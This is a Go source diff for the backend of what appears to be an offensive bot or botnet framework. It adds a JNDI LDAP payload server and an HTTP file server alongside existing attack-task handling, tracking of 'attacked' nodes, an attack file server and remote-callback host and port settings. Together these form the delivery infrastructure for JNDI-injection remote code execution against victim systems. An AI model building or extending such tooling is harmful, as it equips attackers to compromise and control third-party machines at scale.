@@ -3,11 +3,14 @@ package backend
 import (
 	"fmt"
 	"github.com/sbot/handler"
+	"github.com/sbot/jndi"
 	"github.com/sbot/rpc"
 	"github.com/sbot/server"
 	"github.com/sbot/store"
 	redisstore "github.com/sbot/store/redis"
 	"github.com/sbot/utils/jsonutils"
+	"strconv"
+	"strings"
 )
 
 const (
@@ -24,11 +27,16 @@ const (
 )
 
 type SbotBackend struct {
+
 	cfg *Config
 
 	rpcService *rpc.GRPCService
 
 	attackFileServer *server.AttackFileServer
+
+	jndiServer *jndi.JndiServer
+
+	fserver *server.HttpFileServer
 }
 
 func openRedisDB(cfg *Config, db, table string) (store.Store, error) {
@@ -61,7 +69,7 @@ func openRedisDB(cfg *Config, db, table string) (store.Store, error) {
 	return rdb, nil
 }
 
-func makeNodeHandle(cfg *Config) (*handler.NodeHandler, error) {
+func makeNodeHandle(cfg *Config, db store.Store) (*handler.NodeHandler, error) {
 
 	dbnode, err := openRedisDB(cfg, AttackedNodeDB, AttackedNodeDBTable)
 	if err != nil {
@@ -75,7 +83,7 @@ func makeNodeHandle(cfg *Config) (*handler.NodeHandler, error) {
 		return nil, err
 	}
 
-	return handler.NewNodeHandler(dbnode, attackProcessDB), nil
+	return handler.NewNodeHandler(dbnode, attackProcessDB,db), nil
 
 }
 
@@ -87,13 +95,21 @@ func makeAttackTaskHandle(cfg *Config) (*handler.AttackTaskHandler, error) {
 		return nil, err
 	}
 
+	jport,err := strconv.ParseInt(strings.Split(cfg.JNDILdapAddress,":")[1],10,32)
+
+	if err!=nil {
+		return nil,err
+	}
+
 	return handler.NewAttackTaskHandler(cfg.CBotFileStoreDir,
 		cfg.AttackFileServerDir,
 		cfg.RHost, cfg.RPort,
-		cfg.AttackFileServerPort, db), nil
+		cfg.AttackFileServerPort,
+		int(jport),
+		db), nil
 }
 
-func makeAttackFileDownloadHandle(cfg *Config) (*handler.AttackFileServerHandle, error) {
+func makeAttackFileDownloadHandle(cfg *Config,attackTaskDB store.Store) (*handler.AttackFileServerHandle, error) {
 
 	db, err := openRedisDB(cfg, AttackFileDownloadDB, AttackFileDownloadTable)
 	if err != nil {
@@ -101,7 +117,7 @@ func makeAttackFileDownloadHandle(cfg *Config) (*handler.AttackFileServerHandle,
 		return nil, err
 	}
 
-	return handler.NewAttackFileServerHandle(db), nil
+	return handler.NewAttackFileServerHandle(db,attackTaskDB), nil
 }
 
 func makeSbotQueryHandle(cfg *Config) (*handler.SbotQueryHandler,error) {
@@ -143,13 +159,6 @@ func NewSbotBacked(cfile string) (*SbotBackend, error) {
 		return nil, err
 	}
 
-	nodeHandle, err := makeNodeHandle(&cfg)
-	if err != nil {
-
-		log.Errorf("Create attacked node handler failed:%v\n", err)
-		return nil, err
-	}
-
 	attackTaskHandle, err := makeAttackTaskHandle(&cfg)
 	if err != nil {
 
@@ -157,7 +166,14 @@ func NewSbotBacked(cfile string) (*SbotBackend, error) {
 		return nil, err
 	}
 
-	attackFileDownloadHandle, err := makeAttackFileDownloadHandle(&cfg)
+	nodeHandle, err := makeNodeHandle(&cfg,attackTaskHandle.GetAttackTaskDB())
+	if err != nil {
+
+		log.Errorf("Create attacked node handler failed:%v\n", err)
+		return nil, err
+	}
+
+	attackFileDownloadHandle, err := makeAttackFileDownloadHandle(&cfg,attackTaskHandle.GetAttackTaskDB())
 	if err != nil {
 
 		log.Errorf("Create attack file download handler failed:%v\n", err)
@@ -186,6 +202,12 @@ func NewSbotBacked(cfile string) (*SbotBackend, error) {
 
 	}
 
+	jndiServer,err := jndi.NewJndiServer(cfg.JNDILdapPayloadDir,cfg.JNDILdapAddress,cfg.JNDILdapCodeBase)
+	if err!=nil {
+		log.Errorf("Create jndi ldap server failed:%v\n",err)
+		return nil,err
+	}
+
 	rpcCfg := &rpc.Config{
 		Host:     "0.0.0.0",
 		Port:     cfg.RPort,
@@ -205,6 +227,10 @@ func NewSbotBacked(cfile string) (*SbotBackend, error) {
 			cfg.AttackFileServerDir,
 			"0.0.0.0",
 			cfg.AttackFileServerPort),
+
+			jndiServer:jndiServer,
+
+			fserver: server.NewHttpFileServer(cfg.HttpFileServerDir,cfg.HttpFileServerAddr),
 	}, nil
 
 }
@@ -218,4 +244,10 @@ func (sb *SbotBackend) Start() {
 
 	go sb.attackFileServer.Start()
 
+	go sb.fserver.Start()
+
+	go sb.jndiServer.Start()
+
+
 }
+
